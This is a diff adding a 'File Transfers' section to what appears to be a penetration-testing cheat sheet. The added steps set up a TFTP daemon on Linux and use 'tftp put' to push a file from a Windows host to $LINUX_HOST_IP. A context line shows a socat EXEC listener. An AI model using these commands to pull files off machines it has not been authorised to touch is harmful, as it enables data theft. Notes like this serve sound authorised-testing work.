@@ -60,6 +60,20 @@ B machine (Windows): `socat OPENSSL-LISTEN:$PORT,cert=cert.pem,verify=0,fork EXE
 ### Busybox
 `busybox httpd -f -p $PORT`
 
+## File Transfers
+
+### Windows to Linux
+
+#### No Powershell
+On the linux host setup TFTP:
+* `sudo apt update && sudo apt install tftp`
+* `sudo mkdir /tftp`
+* `sudo chown nobody: /tftp`
+* `sudo atftpd --daemon --port 69 /tftp`
+
+On the windows host:
+`tftp -i $LINUX_HOST_IP put important-document.extension`
+
 ## Proxy Traffic
 
 ### Windows
